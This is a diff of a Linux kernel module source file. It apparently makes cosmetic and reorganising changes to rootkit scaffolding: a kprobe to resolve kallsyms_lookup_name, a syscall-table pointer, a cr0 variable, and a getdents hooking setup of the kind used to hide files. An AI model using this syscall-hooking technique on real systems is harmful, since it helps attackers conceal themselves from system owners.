@@ -32,20 +32,21 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 
 #include <linux/linkage.h>
 #include <linux/dirent.h>
+#include <linux/kprobes.h>
 
 unsigned long cr0;
 unsigned long *__syscall_table;
 unsigned long __force_order;
 
-enum NR_getdents{
-	__NR_getdents = 141
+enum My_NR_getdents {
+    MY_NR_getdents = 141
 };
 
 struct linux_dirent {
-        unsigned long   d_ino;
-        unsigned long   d_off;
-        unsigned short  d_reclen;
-        char            d_name[];
+    unsigned long   d_ino;
+    unsigned long   d_off;
+    unsigned short  d_reclen;
+    char            d_name[];
 };
 
 /*
@@ -54,10 +55,8 @@ struct linux_dirent {
  * Full credit to @f0lg0 for the idea.
  * And full credit to Harvey Phillips (xcellerator@gmx.com) for code that inspired me.
  */
-#include <linux/kprobes.h>
-
 static struct kprobe kp = {
-	    .symbol_name = "kallsyms_lookup_name"
+    .symbol_name = "kallsyms_lookup_name"
 };
 
 #define HOOK(_name, _hook, _orig)   \
@@ -66,11 +65,3 @@ static struct kprobe kp = {
     .function = (_hook),        \
     .original = (_orig),        \
 }
-
-struct linux_dirent64 {
-    ino64_t        d_ino;
-    off64_t        d_off;
-    unsigned short d_reclen;
-    unsigned char  d_type;
-    char           d_name[0];
-};
